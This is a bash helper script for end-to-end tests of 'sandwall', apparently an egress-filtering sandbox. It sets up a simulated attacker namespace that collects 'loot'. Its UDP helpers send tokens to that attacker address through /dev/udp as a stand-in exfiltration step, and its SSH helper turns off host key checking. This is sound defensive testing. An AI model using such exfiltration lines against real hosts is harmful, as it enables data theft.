# Shared helpers for sandwall end-to-end tests. Source from a test script.
# Requires root, a Linux host, nft, iproute2, tcpdump, dig, curl, jq, python3.

set -uo pipefail

: "${SANDWALL:?set SANDWALL to the sandwall binary}"

E2E_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# E2E_TMP: where the per-run directory (state, logs, snapshots) goes. For VM
# mode keep it on the same filesystem as CHROOT_BASE so clones can hard-link
# the snapshot memory file instead of copying it.
E2E_TMP=${E2E_TMP:-/tmp}
CHROOT_BASE=${CHROOT_BASE:-/srv/jailer}
mkdir -p "$E2E_TMP"
T="$(mktemp -d "$E2E_TMP/sandwall-e2e.XXXXXX")"
# Sandbox commands run as nobody, which may not be able to read the checkout
# (a 0750 home directory, say), so helpers they run are copied here.
SBX_DIR="$(mktemp -d "$E2E_TMP/sandwall-sbx.XXXXXX")"
chmod 0755 "$SBX_DIR"
install -m 0644 "$E2E_DIR/conns.py" "$SBX_DIR/"
SOCK="$T/sandwall.sock"
STATE="$T/state"
LOGS="$T/logs"
G=(--socket "$SOCK" --state-dir "$STATE" --log-dir "$LOGS" --chroot-base "$CHROOT_BASE")
DAEMON_PID=""
PASS=0
FAIL=0
SKIP=0

# Attacker endpoint: its own netns behind a routed veth, so sandbox traffic
# to it takes the host FORWARD path like any internet destination would.
ATTACKER_NS=egattacker
ATTACKER_IP=10.99.0.1
ATTACKER_GW=10.99.0.254
ATTACKER_PORT=8080
ATTACKER_HOLD_PORT=9000
ATTACKER_DNS_PORT=5353
ATTACKER_UDP_PORT=9999

UPLINK="$(ip -4 route show default | awk '{for (i=1;i<NF;i++) if ($i=="dev") print $(i+1); exit}')"
HOST_IP="$(ip -4 -o addr show dev "$UPLINK" | awk '{split($4,a,"/"); print a[1]; exit}')"
GATEWAY_IP="$(ip -4 route show default | awk '{print $3; exit}')"

log()  { printf '\n== %s\n' "$*"; }
pass() { printf '  ok    %s\n' "$*"; PASS=$((PASS + 1)); }
fail() { printf '  FAIL  %s\n' "$*"; FAIL=$((FAIL + 1)); }
# skip: a check that could not run here; reported, never counted as passed.
skip() { printf '  SKIP  %s\n' "$*"; SKIP=$((SKIP + 1)); }

sandwall() { "$SANDWALL" "${G[@]}" "$@"; }
sbx() { local id=$1; shift; sandwall sandbox exec "$id" -- "$@"; }

# dns_status <sandbox> <dig args...>: the response status (NOERROR, REFUSED,
# ...) or empty if no answer arrived.
dns_status() {
	local id=$1; shift
	sbx "$id" dig +tries=1 +time=3 "$@" | awk '/status:/ {gsub(",", "", $6); print $6}'
}

expect_ok() {
	local desc=$1; shift
	local out
	if out=$("$@" 2>&1); then pass "$desc"; else fail "$desc"; printf '        %s\n' "${out//$'\n'/$'\n'        }"; fi
}

expect_fail() {
	local desc=$1; shift
	if "$@" >/dev/null 2>&1; then fail "$desc (unexpectedly succeeded)"; else pass "$desc"; fi
}

expect_eq() {
	local desc=$1 got=$2 want=$3
	if [[ "$got" == "$want" ]]; then pass "$desc"; else fail "$desc: got '$got', want '$want'"; fi
}

# wait_log <sandbox> <desc> <jq boolean expr>: poll the sandbox log until a
# line matches (up to 5s).
wait_log() {
	local id=$1 desc=$2 expr=$3 file="$LOGS/$1.jsonl"
	for _ in $(seq 50); do
		if [[ -f "$file" ]] && jq -c "select($expr)" "$file" 2>/dev/null | grep -q .; then
			pass "$desc"
			return
		fi
		sleep 0.1
	done
	fail "$desc (no log line matching: $expr)"
	[[ -f "$file" ]] && tail -n 5 "$file" | sed 's/^/        /'
}

# REAL_PROXY=http://host:port: the host has no direct internet access and
# reaches it through this HTTP proxy. Daemons then use it as their upstream
# proxy, with the local attacker net as a no_proxy destination, so internet
# checks go through the proxy and attacker checks behave as without one.
# Scripts that pass their own --upstream-proxy (proxy.sh) are left alone.
REAL_PROXY=${REAL_PROXY:-}

# start_daemon [extra daemon flags...]
start_daemon() {
	local extra=()
	if [[ -n "$REAL_PROXY" && " $* " != *" --upstream-proxy "* ]]; then
		extra=(--upstream-proxy "$REAL_PROXY" --no-proxy 10.99.0.0/24)
	fi
	"$SANDWALL" "${G[@]}" daemon --blocked-exempt 10.99.0.0/24 --metrics-addr 127.0.0.1:19464 "${extra[@]}" "$@" \
		>>"$T/daemon.log" 2>&1 &
	DAEMON_PID=$!
	for _ in $(seq 50); do
		[[ -S "$SOCK" ]] && sandwall sandbox list >/dev/null 2>&1 && return 0
		sleep 0.1
	done
	echo "daemon failed to start:" >&2
	cat "$T/daemon.log" >&2
	return 1
}

stop_daemon() {
	[[ -n "$DAEMON_PID" ]] || return 0
	kill "$DAEMON_PID" 2>/dev/null
	wait "$DAEMON_PID" 2>/dev/null
	DAEMON_PID=""
}

setup_attacker() {
	teardown_attacker
	ip netns add "$ATTACKER_NS"
	ip link add egtest0 type veth peer name egtest0p
	ip link set egtest0p netns "$ATTACKER_NS"
	ip addr add "$ATTACKER_GW/24" dev egtest0
	ip link set egtest0 up
	ip -n "$ATTACKER_NS" addr add "$ATTACKER_IP/24" dev egtest0p
	ip -n "$ATTACKER_NS" link set egtest0p up
	ip -n "$ATTACKER_NS" link set lo up
	ip -n "$ATTACKER_NS" route add default via "$ATTACKER_GW"
	ATTACKER_LOOT="$T/loot.txt"
	: >"$ATTACKER_LOOT"
	ip netns exec "$ATTACKER_NS" python3 "$E2E_DIR/attacker.py" --bind "$ATTACKER_IP" \
		--port "$ATTACKER_PORT" --loot "$ATTACKER_LOOT" \
		--hold-port "$ATTACKER_HOLD_PORT" --dns-port "$ATTACKER_DNS_PORT" --udp-port "$ATTACKER_UDP_PORT" \
		>"$T/attacker.log" 2>&1 &
	for _ in $(seq 50); do
		curl -s -m 1 "http://$ATTACKER_IP:$ATTACKER_PORT/" >/dev/null && return 0
		sleep 0.1
	done
	echo "attacker endpoint failed to start" >&2
	return 1
}

# start_iperf <port...>: iperf3 servers in the attacker netns.
start_iperf() {
	local port
	for port in "$@"; do
		ip netns exec "$ATTACKER_NS" iperf3 -s -B "$ATTACKER_IP" -p "$port" -D --logfile "$T/iperf-$port.log"
	done
	sleep 0.5
}

# mbps <iperf3 json file>: receiver-side throughput in Mbit/s, integer.
mbps() { jq '.end.sum_received.bits_per_second / 1e6 | floor' "$1"; }

# metric <name> <labels-regex>: value of a Prometheus series, or empty.
metric() {
	curl -s http://127.0.0.1:19464/metrics | awk -v n="$1" -v l="$2" '$1 ~ "^"n"\\{" && $1 ~ l {print $2; exit}'
}

# wait_closed <src ip> <dst port>: wait until no TCP connection from src to
# dst port is still open in conntrack (TIME_WAIT/CLOSE do not count against
# connection limits; every other state does).
wait_closed() {
	for _ in $(seq 100); do
		if ! conntrack -L -p tcp -s "$1" --dport "$2" 2>/dev/null | grep -vqE 'TIME_WAIT|CLOSE '; then
			return 0
		fi
		sleep 0.1
	done
	echo "connections from $1 to port $2 still open" >&2
	return 1
}

teardown_attacker() {
	ip netns pids "$ATTACKER_NS" 2>/dev/null | xargs -r kill 2>/dev/null
	ip link del egtest0 2>/dev/null
	ip netns del "$ATTACKER_NS" 2>/dev/null
	return 0
}

# --- VM mode -------------------------------------------------------------

FC_ASSETS=${FC_ASSETS:-/var/lib/sandwall-fc}
FC_FLAGS=(--firecracker "$FC_ASSETS/firecracker" --jailer "$FC_ASSETS/jailer")

sb_field() { sandwall sandbox list --json | jq -r --arg id "$1" ".[] | select(.id==\$id) | $2"; }

# vmx <id> <remote command>: run a command in the sandbox's guest over SSH
# from inside its netns (the netns reaches the guest directly on tap0).
# ssh joins arguments into one remote command line, so quote accordingly.
vmx() {
	local id=$1; shift
	ip netns exec "$(sb_field "$id" .netns)" ssh -i "$FC_ASSETS/id_ed25519" \
		-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o LogLevel=ERROR \
		-o ConnectTimeout=30 -o BatchMode=yes root@172.16.0.2 "$@"
}

vm_dns_status() {
	local id=$1; shift
	vmx "$id" dig +tries=1 +time=3 "$@" | awk '/status:/ {gsub(",", "", $6); print $6}'
}

# wait_guest <id>: wait until the guest answers SSH (up to 60s).
wait_guest() {
	for _ in $(seq 120); do
		vmx "$1" true 2>/dev/null && return 0
		sleep 0.5
	done
	echo "guest $1 not reachable" >&2
	return 1
}

# fc_api <id> <path>: GET from the sandbox's Firecracker API.
fc_api() {
	curl -s --unix-socket "$(sb_field "$1" .vm.jail_root)/run/firecracker.socket" "http://localhost$2"
}

# udp_delivered <sandbox> <desc>: send a unique UDP datagram from the
# sandbox to the attacker's UDP sink and check that it arrived.
udp_delivered() {
	local token="udp-$RANDOM-$RANDOM"
	sbx "$1" bash -c "echo $token >/dev/udp/$ATTACKER_IP/$ATTACKER_UDP_PORT"
	for _ in $(seq 30); do
		grep -q "^udp: $token\$" "$ATTACKER_LOOT" && { pass "$2"; return; }
		sleep 0.1
	done
	fail "$2 (datagram $token never arrived)"
}

# udp_not_delivered <sandbox> <desc>: the datagram must not arrive.
udp_not_delivered() {
	local token="udp-$RANDOM-$RANDOM"
	sbx "$1" bash -c "echo $token >/dev/udp/$ATTACKER_IP/$ATTACKER_UDP_PORT"
	sleep 1
	if grep -q "^udp: $token\$" "$ATTACKER_LOOT"; then fail "$2 (datagram $token arrived)"; else pass "$2"; fi
}

# assert_no_remnants: nothing sandwall-owned is left on the host.
assert_no_remnants() {
	expect_eq "no sb<k> netns left" "$(ip netns list | grep -cE '^sb[0-9]+')" 0
	expect_eq "no veth-h<k> links left" "$(ip -o link | grep -cE ' veth-[hs][0-9]+')" 0
	expect_eq "no eg-ifb<k> links left" "$(ip -o link | grep -cE ' eg-ifb[0-9]+')" 0
	expect_eq "no sandwall nft table left" "$(nft list tables | grep -c sandwall)" 0
	expect_eq "no tc qdiscs on sandbox veths" "$(tc qdisc show | grep -c veth-h)" 0
	expect_eq "no /etc/netns/sb<k> left" "$(find /etc/netns -maxdepth 1 -name 'sb[0-9]*' 2>/dev/null | wc -l)" 0
	expect_eq "no firecracker processes left" "$(pgrep -c -f 'firecracker --id sandwall-sb' || true)" 0
	expect_eq "no sandwall jails left" "$(find "$CHROOT_BASE" -mindepth 2 -maxdepth 2 -name 'sandwall-sb*' 2>/dev/null | wc -l)" 0
}

finish() {
	stop_daemon
	"$SANDWALL" "${G[@]}" nuke >/dev/null 2>&1
	teardown_attacker
	rm -rf "$SBX_DIR"
	printf '\n%d passed, %d failed' "$PASS" "$FAIL"
	((SKIP > 0)) && printf ', %d skipped' "$SKIP"
	printf '\n'
	if ((FAIL > 0)); then
		echo "artifacts kept in $T"
		exit 1
	fi
	rm -rf "$T"
}
